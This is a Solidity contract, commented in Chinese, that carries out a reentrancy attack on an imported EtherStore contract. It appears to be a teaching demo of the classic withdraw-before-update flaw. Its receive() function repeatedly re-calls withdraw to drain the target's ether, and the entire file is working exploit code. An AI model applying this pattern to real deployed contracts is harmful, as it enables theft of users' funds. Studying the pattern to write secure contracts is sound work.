// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./EtherStore.sol";

/**
 * Attack - 重入攻击合约
 * 攻击原理：利用 EtherStore 的 fallback() 调用，在余额扣减前反复取款
 */
contract Attack {
    EtherStore public etherStore;
    address public attacker;
    
    // 记录递归深度，防止无限递归（安全起见）
    uint256 private constant MAX_RECURSION = 10;
    uint256 private recursionDepth;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
        attacker = msg.sender;
        recursionDepth = 0;
    }

    /**
     * receive 函数 - 接收 ETH
     * 攻击核心：当收到 ETH 时，检查银行是否还有钱
     * 如果有钱，再次调用取款函数
     */
    receive() external payable {
        // 防止无限递归
        recursionDepth++;
        require(recursionDepth <= MAX_RECURSION, "Max recursion depth exceeded");
        
        // 检查：银行还有钱吗？
        // 注意：这里检查的是 EtherStore 合约的总余额
        if (address(etherStore).balance >= 1 ether) {
            // 攻击：再次调用取款函数（递归）
            etherStore.withdraw();
        }
        
        recursionDepth--;
    }

    /**
     * attack - 发起攻击的入口函数
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        
        // 第一步：存入 ETH
        etherStore.deposit{value: msg.value}();
        
        // 重置递归深度
        recursionDepth = 0;
        
        // 第二步：尝试取款（触发 fallback）
        etherStore.withdraw();
    }

    /**
     * 查看攻击合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}